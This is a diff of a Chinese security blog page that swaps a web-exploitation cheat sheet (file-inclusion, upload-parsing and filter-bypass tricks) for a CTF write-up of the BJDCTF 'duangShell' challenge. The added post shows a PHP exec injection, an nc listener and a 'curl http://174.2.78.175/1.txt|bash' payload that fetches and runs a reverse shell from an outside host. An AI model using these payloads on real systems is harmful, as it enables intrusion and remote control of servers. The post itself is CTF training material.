@@ -20,27 +20,33 @@
     var CONFIG = {"hostname":"czlz.net","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="前言复习之前的课程并结合做题的经验做一下小结">
+  <meta name="description" content="特意找来的题，练习一下反弹Shell">
 <meta property="og:type" content="article">
-<meta property="og:title" content="WEB小结（大比武_CTF课_小结一）">
-<meta property="og:url" content="https://czlz.net/2020/jxsw_dbw_web_summary1/index.html">
+<meta property="og:title" content="【BJDCTF 2nd】duangShell">
+<meta property="og:url" content="https://czlz.net/2020/ctf_web_buuoj_cn_BJDCTF_2nd_duangShell1/index.html">
 <meta property="og:site_name" content="粗制乱造的个人网站">
-<meta property="og:description" content="前言复习之前的课程并结合做题的经验做一下小结">
+<meta property="og:description" content="特意找来的题，练习一下反弹Shell">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2020-07-05T16:00:00.000Z">
-<meta property="article:modified_time" content="2020-07-13T02:05:38.367Z">
+<meta property="og:image" content="https://czlz.net/2020/ctf_web_buuoj_cn_BJDCTF_2nd_duangShell1/1.png">
+<meta property="og:image" content="https://czlz.net/2020/ctf_web_buuoj_cn_BJDCTF_2nd_duangShell1/2.png">
+<meta property="og:image" content="https://czlz.net/2020/ctf_web_buuoj_cn_BJDCTF_2nd_duangShell1/3.png">
+<meta property="og:image" content="https://czlz.net/2020/ctf_web_buuoj_cn_BJDCTF_2nd_duangShell1/4.png">
+<meta property="og:image" content="https://czlz.net/2020/ctf_web_buuoj_cn_BJDCTF_2nd_duangShell1/5.png">
+<meta property="og:image" content="https://czlz.net/2020/ctf_web_buuoj_cn_BJDCTF_2nd_duangShell1/6.png">
+<meta property="og:image" content="https://czlz.net/2020/ctf_web_buuoj_cn_BJDCTF_2nd_duangShell1/7.png">
+<meta property="og:image" content="https://czlz.net/2020/ctf_web_buuoj_cn_BJDCTF_2nd_duangShell1/8.png">
+<meta property="article:published_time" content="2020-07-15T16:00:00.000Z">
+<meta property="article:modified_time" content="2020-07-17T15:29:40.321Z">
 <meta property="article:author" content="粗制乱造">
 <meta property="article:tag" content="CTF">
+<meta property="article:tag" content="练习题">
+<meta property="article:tag" content="CTF课">
 <meta property="article:tag" content="WEB">
-<meta property="article:tag" content="黑盒测试">
-<meta property="article:tag" content="RCE">
-<meta property="article:tag" content="CVE">
-<meta property="article:tag" content="小结">
-<meta property="article:tag" content="注入">
-<meta property="article:tag" content="PHP">
+<meta property="article:tag" content="反弹Shell">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://czlz.net/2020/ctf_web_buuoj_cn_BJDCTF_2nd_duangShell1/1.png">
 
-<link rel="canonical" href="https://czlz.net/2020/jxsw_dbw_web_summary1/">
+<link rel="canonical" href="https://czlz.net/2020/ctf_web_buuoj_cn_BJDCTF_2nd_duangShell1/">
 
 
 <script id="page-configurations">
@@ -53,7 +59,7 @@
   };
 </script>
 
-  <title>WEB小结（大比武_CTF课_小结一） | 粗制乱造的个人网站</title>
+  <title>【BJDCTF 2nd】duangShell | 粗制乱造的个人网站</title>
   
 
 
@@ -207,7 +213,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://czlz.net/2020/jxsw_dbw_web_summary1/">
+    <link itemprop="mainEntityOfPage" href="https://czlz.net/2020/ctf_web_buuoj_cn_BJDCTF_2nd_duangShell1/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/file/avatar.png">
@@ -220,7 +226,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          WEB小结（大比武_CTF课_小结一）
+          【BJDCTF 2nd】duangShell
         </h1>
 
         <div class="post-meta">
@@ -230,14 +236,14 @@
               </span>
               <span class="post-meta-item-text">发表于</span>
 
-              <time title="创建时间：2020-07-06 00:00:00" itemprop="dateCreated datePublished" datetime="2020-07-06T00:00:00+08:00">2020-07-06</time>
+              <time title="创建时间：2020-07-16 00:00:00" itemprop="dateCreated datePublished" datetime="2020-07-16T00:00:00+08:00">2020-07-16</time>
             </span>
               <span class="post-meta-item">
                 <span class="post-meta-item-icon">
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-07-13 10:05:38" itemprop="dateModified" datetime="2020-07-13T10:05:38+08:00">2020-07-13</time>
+                <time title="修改时间：2020-07-17 23:29:40" itemprop="dateModified" datetime="2020-07-17T23:29:40+08:00">2020-07-17</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -249,15 +255,15 @@
                 </span>
                   ，
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF/%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">笔记</span></a>
+                  <a href="/categories/CTF/buuoj-cn/" itemprop="url" rel="index"><span itemprop="name">buuoj_cn</span></a>
                 </span>
                   ，
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF/%E7%AC%94%E8%AE%B0/WEB/" itemprop="url" rel="index"><span itemprop="name">WEB</span></a>
+                  <a href="/categories/CTF/buuoj-cn/WEB/" itemprop="url" rel="index"><span itemprop="name">WEB</span></a>
                 </span>
                   ，
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF/%E7%AC%94%E8%AE%B0/WEB/%E5%B0%8F%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">小结</span></a>
+                  <a href="/categories/CTF/buuoj-cn/WEB/Shell/" itemprop="url" rel="index"><span itemprop="name">Shell</span></a>
                 </span>
             </span>
 
@@ -273,43 +279,29 @@
 
       
         <!-- toc -->
-<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>复习之前的课程并结合做题的经验做一下小结</p>
-<a id="more"></a>
-
-<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><h2 id="waf绕过"><a href="#waf绕过" class="headerlink" title="waf绕过"></a>waf绕过</h2><p>1、输入参数绕过</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?num &#x3D; aaaa   &#x2F;&#x2F;显示非法输入的话</span><br><span class="line">?%20num &#x3D; aaa</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><p>PHP真的是漏洞之王(反正我的博客关注的人少)。下面开始总结</p>
-<h3 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h3><p>1、include 漏洞</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> $_REQUEST[<span class="string">'file'</span>];</span><br></pre></td></tr></table></figure>
-<p>绕过方式。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;hint.php?&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
-<p>原理：?/被当作目录了。<br>目标系统：只能在linux下使用。</p>
-<p>2、include使用PHP伪协议<br>php://filter/read=convert.base64-encode/resource=flag.php</p>
-<h3 id="过滤绕过"><a href="#过滤绕过" class="headerlink" title="过滤绕过"></a>过滤绕过</h3><p>1、取反(<del>)绕过。<br>   readfile(</del>%D0%99%CE%9E%98%98);<br>2、异或(^)绕过。</p>
-<h3 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h3><p>.user.ini配置文件自 PHP 5.3.0 起，PHP 支持基于每个目录的 .htaccess 风格的 INI 文件。此类文件仅被 CGI／FastCGISAPI 处理。<br>利用条件：<br>1、服务器使用CGI／FastCGI模式。<br>2、上传目录下要有可执行的php文件<br>利用方式：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file&#x3D;1.jpg</span><br><span class="line">#让所有当前目录下可执行php文件包含1.jpg</span><br></pre></td></tr></table></figure>
-
-
-<h3 id="短标签"><a href="#短标签" class="headerlink" title="短标签"></a>短标签</h3><p>当不能使用<?php>时。
-可以尝试使用
-1、<? ?><br>2、<script language="php"></script></p>
-<h2 id="python"><a href="#python" class="headerlink" title="python"></a>python</h2><h3 id="模板攻击"><a href="#模板攻击" class="headerlink" title="模板攻击"></a>模板攻击</h3><h4 id="tornado模板泄露"><a href="#tornado模板泄露" class="headerlink" title="tornado模板泄露"></a>tornado模板泄露</h4><p>python 端模板注入(ssti攻击)</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;error?msg&#x3D;&#123;&#123;1&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="MYSQL注入"><a href="#MYSQL注入" class="headerlink" title="MYSQL注入"></a>MYSQL注入</h2><h3 id="普通注入"><a href="#普通注入" class="headerlink" title="普通注入"></a>普通注入</h3><p>在URL中要使用%23代替#</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">select group_concat(schema_name) from information_schema.schemata</span><br></pre></td></tr></table></figure>
-<h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>参考链接：<a href="/2020/jxsw_dbw_web_1/" title="MYSQL注入绕过（大比武_CTF课_第一天）">MYSQL注入绕过（大比武_CTF课_第一天）</a></p>
-<h3 id="apache漏洞"><a href="#apache漏洞" class="headerlink" title="apache漏洞"></a>apache漏洞</h3><p>1、文件解析漏洞，文件执行是按从右到左的。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1.php.xxx会按php执行。</span><br></pre></td></tr></table></figure>
-<p>2、%0a漏洞。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">上传一个1.php%0a。会被按PHP执行。但是必须是linux下。</span><br></pre></td></tr></table></figure>
-
-<h3 id="nginx漏洞"><a href="#nginx漏洞" class="headerlink" title="nginx漏洞"></a>nginx漏洞</h3><p>1、文件解析漏洞，文件执行是按从右到左的。<br>1、shell.jpg/.php</p>
-<h3 id="windows文件漏洞"><a href="#windows文件漏洞" class="headerlink" title="windows文件漏洞"></a>windows文件漏洞</h3><p>1、冒号漏洞<br>info.php:.jpg<br>info.php::$DATA<br>1.php.<br>1.php%20</p>
-<h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><h3 id="nmap写入shell"><a href="#nmap写入shell" class="headerlink" title="nmap写入shell"></a>nmap写入shell</h3><p>nmap   -F -oG test.php</p>
-<h3 id="Perl命令执行"><a href="#Perl命令执行" class="headerlink" title="Perl命令执行"></a>Perl命令执行</h3><p>条件<br>1.目标服务器上必须安装了libwww-perl这个库不然无法。<br>2.执行命令的目录下必须有目标文件，例如执行ls，则执行命令的目录下必须有该命令。<br>操作<br>mkdir ls\<br>GET </p>
+<pre><code>特意找来的题，练习一下反弹Shell</code></pre><a id="more"></a>
+<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p><img src="1.png" alt=""><br>一上来就已经提示了.swp源码泄露</p>
+<blockquote>
+<p>使用vim编辑器打开文件时，会生成一个.文件名.swp的备份文件。<br>根据提示下载.index.php.swp。</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim -r .index.php.swp</span><br><span class="line">#esc w index.php</span><br></pre></td></tr></table></figure>
+<p>恢复后的文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">    &lt;title&gt;give me a girl&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;center&gt;&lt;h1&gt;珍爱网&lt;/h1&gt;&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"how can i give you source code? .swp?!"</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'girl_friend'</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"where is P3rh4ps's girl friend ???"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $girl = $_POST[<span class="string">'girl_friend'</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/\&gt;|\\\/'</span>, $girl)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'just girl'</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (preg_match(<span class="string">'/ls|phpinfo|cat|\%|\^|\~|base64|xxd|echo|\$/i'</span>, $girl)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;img src='img/p3_need_beautiful_gf.png'&gt; &lt;!-- He is p3 --&gt;"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//duangShell~~~~</span></span><br><span class="line">        exec($girl);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>要我们POST[girl_friend]。而且过滤掉了不少&gt;,\和一些常用拿flag的函数。而且摆明要我们玩反弹Shell。那就开搞吧。<br>虽然过滤掉了重定向符。但是管道符|还在。<br>可以通过下载我们服务器上的shell文件来执行。这样就不用直接输入了。</p>
+<h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1><h2 id="攻击机上的操作"><a href="#攻击机上的操作" class="headerlink" title="攻击机上的操作"></a>攻击机上的操作</h2><p>先在BUU上注册一个小号。在Baser的Linux Labs里开一个虚拟机。<br><img src="2.png" alt=""><br>先收集一下虚拟机的信息<br><img src="3.png" alt=""><br>知道了IP地址。在HTTP服务下，写一个反弹SHELL<br><img src="4.png" alt=""><br>服务器上安装了apache2但是没启动，我们启动一下。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service apache2 start</span><br></pre></td></tr></table></figure>
+<p>然后使用curl命令测试一下，能否正常的读到我们的文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;174.2.78.175&#x2F;1.txt</span><br></pre></td></tr></table></figure>
+<p><img src="5.png" alt=""><br>看来都正常了，启动nc,等待肉机上线。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 11223</span><br></pre></td></tr></table></figure>
+<h2 id="被攻击机上的操作"><a href="#被攻击机上的操作" class="headerlink" title="被攻击机上的操作"></a>被攻击机上的操作</h2><p>仅需一步，肉鸡就上线了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">girl_friend&#x3D;curl http:&#x2F;&#x2F;174.2.78.175&#x2F;1.txt|bash</span><br></pre></td></tr></table></figure>
+<p><img src="6.png" alt=""></p>
+<h2 id="肉鸡上线"><a href="#肉鸡上线" class="headerlink" title="肉鸡上线"></a>肉鸡上线</h2><p><img src="7.png" alt=""><br>现在可以愉快的玩耍了。<br>根据提示我们要找一个叫P3rh4ps的文件。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -name P3rh4ps</span><br></pre></td></tr></table></figure>
+<p>很快就找到了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;demo&#x2F;P3rh4ps</span><br></pre></td></tr></table></figure>
+<p><img src="8.png" alt=""><br>拿到flag</p>
 
     </div>
 
@@ -340,13 +332,10 @@
       <footer class="post-footer">
           <div class="post-tags">
               <a href="/tags/CTF/" rel="tag"># CTF</a>
+              <a href="/tags/%E7%BB%83%E4%B9%A0%E9%A2%98/" rel="tag"># 练习题</a>
+              <a href="/tags/CTF%E8%AF%BE/" rel="tag"># CTF课</a>
               <a href="/tags/WEB/" rel="tag"># WEB</a>
-              <a href="/tags/%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/" rel="tag"># 黑盒测试</a>
-              <a href="/tags/RCE/" rel="tag"># RCE</a>
-              <a href="/tags/CVE/" rel="tag"># CVE</a>
-              <a href="/tags/%E5%B0%8F%E7%BB%93/" rel="tag"># 小结</a>
-              <a href="/tags/%E6%B3%A8%E5%85%A5/" rel="tag"># 注入</a>
-              <a href="/tags/PHP/" rel="tag"># PHP</a>
+              <a href="/tags/%E5%8F%8D%E5%BC%B9Shell/" rel="tag"># 反弹Shell</a>
           </div>
 
         
@@ -355,12 +344,12 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2020/jxsw_dbw_web_5/" rel="prev" title="黑盒测试、RCE、CVE（大比武_CTF课_第五天）">
-      <i class="fa fa-chevron-left"></i> 黑盒测试、RCE、CVE（大比武_CTF课_第五天）
+    <a href="/2020/ctf_web_buuoj_cn_De1CTF2019_SSRF_Me/" rel="prev" title="【De1CTF 2019】SSRF Me">
+      <i class="fa fa-chevron-left"></i> 【De1CTF 2019】SSRF Me
     </a></div>
       <div class="post-nav-item">
-    <a href="/2020/jxsw_dbw_web_6/" rel="next" title="WEB复习（大比武_CTF课_第六天）">
-      WEB复习（大比武_CTF课_第六天） <i class="fa fa-chevron-right"></i>
+    <a href="/2020/jxsw_dbw_crypto_1/" rel="next" title="密码学第一天（大比武_CTF课_第十三天）">
+      密码学第一天（大比武_CTF课_第十三天） <i class="fa fa-chevron-right"></i>
     </a></div>
     </div>
       </footer>
@@ -420,7 +409,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#小结"><span class="nav-number">2.</span> <span class="nav-text">小结</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#waf绕过"><span class="nav-number">2.1.</span> <span class="nav-text">waf绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PHP"><span class="nav-number">2.2.</span> <span class="nav-text">PHP</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#文件包含漏洞"><span class="nav-number">2.2.1.</span> <span class="nav-text">文件包含漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#过滤绕过"><span class="nav-number">2.2.2.</span> <span class="nav-text">过滤绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#user-ini"><span class="nav-number">2.2.3.</span> <span class="nav-text">.user.ini</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#短标签"><span class="nav-number">2.2.4.</span> <span class="nav-text">短标签</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#python"><span class="nav-number">2.3.</span> <span class="nav-text">python</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#模板攻击"><span class="nav-number">2.3.1.</span> <span class="nav-text">模板攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#tornado模板泄露"><span class="nav-number">2.3.1.1.</span> <span class="nav-text">tornado模板泄露</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MYSQL注入"><span class="nav-number">2.4.</span> <span class="nav-text">MYSQL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#普通注入"><span class="nav-number">2.4.1.</span> <span class="nav-text">普通注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#堆叠注入"><span class="nav-number">2.4.2.</span> <span class="nav-text">堆叠注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#apache漏洞"><span class="nav-number">2.4.3.</span> <span class="nav-text">apache漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#nginx漏洞"><span class="nav-number">2.4.4.</span> <span class="nav-text">nginx漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#windows文件漏洞"><span class="nav-number">2.4.5.</span> <span class="nav-text">windows文件漏洞</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#其它"><span class="nav-number">2.5.</span> <span class="nav-text">其它</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#nmap写入shell"><span class="nav-number">2.5.1.</span> <span class="nav-text">nmap写入shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Perl命令执行"><span class="nav-number">2.5.2.</span> <span class="nav-text">Perl命令执行</span></a></li></ol></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#分析"><span class="nav-number">1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#解题"><span class="nav-number">2.</span> <span class="nav-text">解题</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#攻击机上的操作"><span class="nav-number">2.1.</span> <span class="nav-text">攻击机上的操作</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#被攻击机上的操作"><span class="nav-number">2.2.</span> <span class="nav-text">被攻击机上的操作</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#肉鸡上线"><span class="nav-number">2.3.</span> <span class="nav-text">肉鸡上线</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -436,20 +425,20 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">24</span>
+          <span class="site-state-item-count">31</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">25</span>
+        <span class="site-state-item-count">30</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">33</span>
+        <span class="site-state-item-count">46</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
